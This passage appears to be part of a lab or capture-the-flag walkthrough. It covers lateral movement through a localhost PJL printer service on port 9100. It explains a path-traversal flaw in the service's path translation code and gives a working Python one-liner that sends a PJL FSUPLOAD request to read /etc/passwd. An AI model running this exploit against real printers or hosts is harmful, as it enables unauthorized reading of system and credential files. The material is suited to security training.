Phase 3: Lateral Movement — lp → archivist
Discovering the Internal Service
ss -tlnp

Expected:

127.0.0.1:9100   (PJL JetDirect printer service)

This service is localhost-only — not reachable from your attacker machine. Since you're already on the target, connect directly.

The PJL Path Traversal
The service has a virtual filesystem rooted at a printer directory. Path translation:

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

os.path.normpath resolves .. but there's no check that the result stays within self._root. So:

Input:  "0:/../../../etc/passwd"
Clean:  "/../../../etc/passwd"
Result: /etc/passwd  ← escaped the printer root

This is the same class as CVE-2010-4107 (HP LaserJet PJL traversal, 2010).

Step 1: Read a File (Proof of Concept)
python3 -c "
import socket, time
s = socket.socket(); s.settimeout(5); s.connect(('127.0.0.1', 9100))
s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../etc/passwd\" OFFSET=0 SIZE=99999999\r\n\x1b%-12345X')
time.sleep(1)
data = b''
try:
    while True:
        c = s.recv(4096)
        if not c: break
        data += c
except: pass
s.close()
print(data.decode(errors='ignore'))
"

Output: Full /etc/passwd contents (confirms traversal works).


